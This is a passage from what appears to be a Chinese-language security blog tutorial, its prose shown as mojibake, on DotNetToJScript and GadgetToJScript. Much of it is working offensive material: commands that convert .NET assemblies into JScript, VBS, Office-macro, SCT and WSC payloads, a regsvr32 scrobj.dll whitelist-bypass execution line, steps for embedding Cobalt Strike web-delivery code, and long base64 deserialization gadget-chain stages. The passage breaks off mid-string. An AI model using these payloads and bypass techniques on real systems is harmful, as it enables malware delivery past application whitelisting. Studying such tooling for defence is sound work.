base64ToStream(serialized_obj);</span><br><span class="line"><span class="keyword">var</span> fmt = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span>);</span><br><span class="line"><span class="keyword">var</span> al = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Collections.ArrayList'</span>);</span><br><span class="line"><span class="keyword">var</span> d = fmt.Deserialize_2(stm);</span><br><span class="line">al.Add(<span class="literal">undefined</span>);</span><br><span class="line"><span class="keyword">var</span> o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    debug(e.message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°éƒ½æ˜¯éœ€è¦è°ƒç”¨.netä¸­çš„åº“ï¼Œç„¶åè¿›è¡Œä¸€ä¸ªååºåˆ—åŒ–è§£å¯†çš„è¿‡ç¨‹</p><h4 id="ToVBS"><a href="#ToVBS" class="headerlink" title="ToVBS"></a>ToVBS</h4><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”ŸæˆVBSè„šæœ¬éœ€è¦ä½¿ç”¨<code>-l</code>å‚æ•°æŒ‡å®švbscript<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -l vbscript -o test2.vbs ExampleAssembly.dll</span><br></pre></td></tr></table></figure></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/9E783D6C-FD64-462D-A8EA-3A4496D23332.png" alt="2ab489a15717637018bdd621de3f2895"></p><h4 id="ToVBA"><a href="#ToVBA" class="headerlink" title="ToVBA"></a>ToVBA</h4><p>ç”Ÿæˆçš„VBAå¯ä»¥ç”¨æ¥æ’å…¥officeå®<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -l vba -o test.txt ExampleAssembly.dll</span><br></pre></td></tr></table></figure></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/8437C1F8-4A99-4716-BFB9-94F7839872BC.png" alt="60c153e14a78918d7f3f2cec5adb6724"></p><h4 id="ToSCT"><a href="#ToSCT" class="headerlink" title="ToSCT"></a>ToSCT</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -u -o test.sct ExampleAssembly.dll</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/B905E07D-9F7A-438E-8C9A-1CE6BCAE65AE.png" alt="8f5c4cd923308caae40f49dc31a31122"></p><p>åˆ©ç”¨<code>regsvr32.exe</code>ç™½åå•æ‰§è¡Œ<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe /u /n /s /i:test.sct scrobj.dll</span><br></pre></td></tr></table></figure></p><h4 id="ToWSC"><a href="#ToWSC" class="headerlink" title="ToWSC"></a>ToWSC</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DotNetToJScript.exe -m -o test.wsc ExampleAssembly.dll</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„wscæ–‡ä»¶åªéœ€è¦åœ¨å…¶ä»–js/aspç¯å¢ƒä¸‹è°ƒç”¨å³å¯<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject("script:C:\\Users\\Patrilic\\Desktop\\DotNetToJScript\\DotNetToJScript\\bin\\Debug\\test.wsc");</span><br></pre></td></tr></table></figure></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/977C7010-C087-4D70-A085-AA2BB893D9FD.png" alt="5587bb1b29e99df5966bbaf5114dcc3e"></p><h4 id="With-Covenaut"><a href="#With-Covenaut" class="headerlink" title="With Covenaut"></a>With Covenaut</h4><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/95A05AA7-24A5-445B-B111-DC8ED95CDF31.png" alt="569761d6f2b8efec74a347c56f84d621"><br><strong>.Netç¨‹åºéƒ½å¯ä»¥ç›´æ¥-cæŒ‡å®šç±»å»è½¬æ¢</strong></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/7C5D1050-B572-4215-87ED-6C26456CB1FC.png" alt="6c75c4aca52c0e0952cdb3258d569b0c"></p><h4 id="With-Powershell"><a href="#With-Powershell" class="headerlink" title="With Powershell"></a>With Powershell</h4><p>åˆ©ç”¨<a href="https://github.com/Cn33liz/StarFighters" target="_blank" rel="noopener">StarFighters</a> å¯ä»¥ç›´æ¥åœ¨vbså’Œjsä¸­æ‰§è¡Œpowershellä»£ç </p><p>åœ¨test.txtä¸­å†™å…¥csçš„web_delivery<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/358C100B-7087-4BA8-8EC3-0C73B8E24B50.png" alt="057cd5f957fc05147a3ee93820708327"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="built_in">Get-Content</span> -Path test.txt</span><br><span class="line"><span class="variable">$bytes</span>  = [System.Text.Encoding]::UNICODE.GetBytes(<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$encoded</span> = [System.Convert]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="variable">$encoded</span></span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/1A0348EE-0D14-4792-BD99-CD512A4549AC.png" alt="3f7de06beaa326e045148bedb33abc7a"></p><p>æ›¿æ¢<code>EncodedPayload</code><br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/F31857A2-6F04-4BA4-814A-D26047AEA2AB.png" alt="76576829f365f78c38ebada4e43bbc10"><br>èŠœæ¹–ï½</p><h3 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h3><p>æ•´ä¸ªåŒ…åˆ†ä¸ºä¸¤ä¸ªé¡¹ç›®<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/742D69B1-6387-46F0-9EEF-F3EA2985B974.png" alt="cc2f1c14330049f22602b8352908b363"></p><p>ä¸»è¦è¿˜æ˜¯<code>DotNetToJScript</code><br>åœ¨Program.csçš„ç¨‹åºå¼€å§‹å°±å®šä¹‰äº†ä¸‰ä¸ªLanguage<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/7CB3112C-2412-4660-B935-1B9C3003D870.png" alt="b1b74cc2f4f5caa3fd3d1f3eac883757"></p><p>åœ¨<code>IScriptGenerator</code>ä¸­å®šä¹‰äº†æ¥å£ï¼Œç„¶ååœ¨switchè¯­å¥ä¸­é€‰å–å…·ä½“çš„ç”Ÿæˆå™¨<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/0CEB8EE1-C462-43B3-8E24-F7F8179A895A.png" alt="231ebb9c6369136f0385a5f6fb4f369a"></p><p>æ•°æ®ç»è¿‡å¤„ç†åŠ å¯†åï¼Œç›´æ¥<code>Properties.Resources.jscript_template.Replace</code>æ›¿æ¢æ¨¡ç‰ˆä¸­çš„å˜é‡<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/01335C9D-DF6C-4352-8DD3-AA085329F242.png" alt="489a50d7e2a4e1e5318e1bc2891264a8"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/335C4830-344D-40C3-A23E-46781CF6D10D.png" alt="3a31a1fdbe4ab02a06b4472bbb508987"></p><h2 id="0x02-GadgetToJScript"><a href="#0x02-GadgetToJScript" class="headerlink" title="0x02 GadgetToJScript"></a>0x02 GadgetToJScript</h2><h3 id="Build-1"><a href="#Build-1" class="headerlink" title="Build"></a>Build</h3><p>Github: <a href="https://github.com/med0x2e/GadgetToJScript" target="_blank" rel="noopener">https://github.com/med0x2e/GadgetToJScript</a></p><p>æˆ‘è¿™é‡Œä½¿ç”¨ <strong>.NET 4.6.1</strong> ç›´æ¥å¯ä»¥ç¼–è¯‘æˆåŠŸ<br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/6998CCD9-91C3-4485-8F42-8B0DB5619759.png" alt="2a951b1b0f5b7229da9de144829ac6c4"></p><h3 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h3><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/D50EBB82-33D2-45B2-A99B-5E327C62A12E.png" alt="788bf013f81071940291182e2345e99b"></p><p>åŸç¨‹åºé»˜è®¤æä¾›äº†<code>js,vbs,vba,hta</code>ï¼Œå››ç§æ–‡ä»¶è½¬æ¢</p><h4 id="ToJS-1"><a href="#ToJS-1" class="headerlink" title="ToJS"></a>ToJS</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GadgetToJScript.exe -w js -e hex -o test</span><br></pre></td></tr></table></figure><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/83247BFE-B124-4018-9C86-0534848766C3.png" alt="c0816446e99a6f049dcf24a309d6bbec"></p><p>è€è§„çŸ©ï¼Œçœ‹çœ‹æºç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Base64ToStream</span>(<span class="params">b,l</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> enc = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Text.ASCIIEncoding"</span>);</span><br><span class="line"><span class="keyword">var</span> length = enc.GetByteCount_2(b);</span><br><span class="line"><span class="keyword">var</span> ba = enc.GetBytes_4(b);</span><br><span class="line"><span class="keyword">var</span> transform = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.Security.Cryptography.FromBase64Transform"</span>);</span><br><span class="line">ba = transform.TransformFinalBlock(ba, <span class="number">0</span>, length);</span><br><span class="line"><span class="keyword">var</span> ms = <span class="keyword">new</span> ActiveXObject(<span class="string">"System.IO.MemoryStream"</span>);</span><br><span class="line">ms.Write(ba, <span class="number">0</span>, l);</span><br><span class="line">ms.Position = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> ms;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> stage_1 = <span class="string">"AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxxA8UmVzb3VyY2VEaWN0aW9uYXJ5DQogICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIg0KICAgICAgICAgICAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogICAgICAgICAgICB4bWxuczpzPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiINCiAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkNvbmZpZ3VyYXRpb247YXNzZW1ibHk9U3lzdGVtLkNvbmZpZ3VyYXRpb24iDQogICAgICAgICAgICB4bWxuczpyPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5SZWZsZWN0aW9uO2Fzc2VtYmx5PW1zY29ybGliIj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJ0eXBlIiBPYmplY3RUeXBlPSJ7eDpUeXBlIHM6VHlwZX0iIE1ldGhvZE5hbWU9IkdldFR5cGUiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+U3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLkFwcFNldHRpbmdzLCBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9zOlN0cmluZz4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJmaWVsZCIgT2JqZWN0SW5zdGFuY2U9IntTdGF0aWNSZXNvdXJjZSB0eXBlfSIgTWV0aG9kTmFtZT0iR2V0RmllbGQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+ZGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHI6QmluZGluZ0ZsYWdzPjQwPC9yOkJpbmRpbmdGbGFncz4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgZmllbGR9IiBNZXRob2ROYW1lPSJTZXRWYWx1ZSI+DQogICAgICAgICAgICAgICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxzOk9iamVjdC8+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpCb29sZWFuPnRydWU8L3M6Qm9vbGVhbj4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXRNZXRob2QiIE9iamVjdEluc3RhbmNlPSJ7eDpTdGF0aWMgYzpDb25maWd1cmF0aW9uTWFuYWdlci5BcHBTZXR0aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9kZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPg0KICAgICAgICAgICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KICAgICAgICAgICAgPC9SZXNvdXJjZURpY3Rpb25hcnk+Cw=="</span>;</span><br><span class="line"><span class="keyword">var</span> stage_2 = <span class="string">"AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAAIEhAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAABwAAAAcAAAAQAgAAAAgAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAoMCgAAAGFTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQMAAABqU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLlNlcmlhbGl6YXRpb24uQWN0aXZpdHlTdXJyb2dhdGVTZWxlY3RvcitPYmplY3RTdXJyb2dhdGUrT2JqZWN0U2VyaWFsaXplZFJlZgIAAAAEdHlwZQttZW1iZXJEYXRhcwMFH1N5c3RlbS5Vbml0eVNlcmlhbGl6YXRpb25Ib2xkZXIKAAAACQsAAAAJDAAAAAEEAAAAAwAAAAkNAAAACQ4AAAABBQAAAAMAAAAJDwAAAAkQAAAAAQYAAAADAAAACREAAAAJEgAAAAEHAAAAAwAAAAkTAAAACRQAAAABCAAAAAMAAAAJFQAAAAkWAAAABAkAAAAcU3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNpemUES2V5cwZWYWx1ZXMAAAMDAAUFCwgcU3lzdGVtLkNvbGxlY3Rpb25zLklDb21wYXJlciRTeXN0ZW0uQ29sbGVjdGlvbnMuSUhhc2hDb2RlUHJvdmlkZXII7FE4PwIAAAAKCgMAAAAJFwAAAAkYAAAABAsAAAAfU3lzdGVtLlVuaXR5U2VyaWFsaXphdGlvbkhvbGRlcgMAAAAERGF0YQlVbml0eVR5cGUMQXNzZW1ibHlOYW1lAQABCAYZAAAA+AFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0TGlzdEl0ZXJhdG9yYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAGGgAAAE5TeXN0ZW0uQ29yZSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQDAAAAAcAAAAJGwAAAAoJHAAAAAkdAAAACAgAAAAACggIAQAAAAENAAAACwAAAAYeAAAA+AFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlKzxTZWxlY3RNYW55SXRlcmF0b3I+ZF9fMTdgMltbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJGgAAABAOAAAACQAAAAgI/v///woICAEAAAAKCQMAAAAKCSEAAAANAgEPAAAACwAAAAYiAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJGgAAABAQAAAABwAAAAkEAAAACgklAAAACggIAAAAAAoICAEAAAABEQAAAAsAAAAGJgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0YVNvdXJjZQQAAAAGJwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYRASAAAABwAAAAkFAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARMAAAALAAAABikAAAApU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5EZXNpZ25lclZlcmIEAAAABioAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAUAAAABQAAAA0CCSsAAAAICAMAAAAJCAAAAAEVAAAACwAAAAYtAAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABi4AAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EBYAAAABAAAACQYAAAAQFwAAAAIAAAAJBwAAAAkHAAAAEBgAAAACAAAABjEAAAACdjIGMgAAAAJ2MQQbAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DAAAABl9pdGVtcwVfc2l6ZQhfdmVyc2lvbgMAAA9TeXN0ZW0uQnl0ZVtdW10ICAkzAAAAAQAAAAEAAAAEHAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCTQAAAAJNQAAAAQdAAAAigFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDErRW51bWVyYXRvcltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAABGxpc3QFaW5kZXgHdmVyc2lvbgdjdXJyZW50AwAAB39TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCAgCCgAAAAAAAAAACgEhAAAAHAAAAAk2AAAACTcAAAABJQAAABwAAAAJOAAAAAk5AAAAASsAAAADAAAACToAAAAJOwAAAAczAAAAAQEAAAAEAAAABwIJPAAAAAoKCgQ0AAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5Bj0AAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkuAAAACgkuAAAABj8AAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGQAAAAARMb2FkCgQ1AAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQlAAAAACS4AAAAJPwAAAAZDAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZEAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgE2AAAANAAAAAZFAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkuAAAACgkuAAAACT8AAAAGSAAAAAhHZXRUeXBlcwoBNwAAADUAAAAJSAAAAAkuAAAACT8AAAAG